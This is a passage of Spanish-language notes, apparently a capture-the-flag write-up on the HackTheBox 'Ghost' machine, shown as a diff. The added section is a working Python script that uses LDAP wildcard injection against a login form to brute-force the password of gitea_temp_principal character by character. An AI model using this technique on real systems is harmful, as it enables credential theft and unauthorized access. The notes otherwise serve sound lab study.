@@ -215,3 +215,49 @@ podemos enumerar el listado de usuarios con los roles
 usando la lista de usuarios hemos intentado hacer una enumeración con kerbrute pero no obtenemos nada. sin embargo investigando podemos identificar que el usuario `gitea_temp_principal@ghost.htb` parece ser vulnerable a ciertos ataques.
 ![[Pasted image 20240718194729.png]]
 
+### script
+
+```python
+import string
+import requests
+from pwn import *
+
+url = 'http://intranet.ghost.htb:8008/login'
+bar = log.progress("Bruteforcing password")
+
+headers = {
+    'Host': 'intranet.ghost.htb:8008',
+    'Accept-Language': 'en-US,en;q=0.5',
+    'Next-Router-State-Tree': '%5B%22%22%2C%7B%22children%22%3A%5B%22login%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
+    'Next-Action': 'c471eb076ccac91d6f828b671795550fd5925940',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Connection': 'keep-alive'
+}
+
+# Formdata
+files = {
+    '1_ldap-username': (None, 'gitea_temp_principal'),
+    '1_ldap-secret': (None, 's*'),
+    '0': (None, '[{},"$K1"]')
+}
+
+password = ""
+while True:
+    for char in string.ascii_lowercase + string.digits:
+        bar.status(f"trying {char} now for the next character...")
+        files = {
+            '1_ldap-username': (None, 'gitea_temp_principal'),
+            '1_ldap-secret': (None, f'{password}{char}*'),
+            '0': (None, '[{},"$K1"]')
+        }
+        res = requests.post(url, headers=headers, files=files)
+        if res.status_code == 303:
+            password += char
+            print(f"The current password is {password} + *")
+            break
+    else:
+        break
+    
+bar.success(f"The final password is {password}")
+```
+
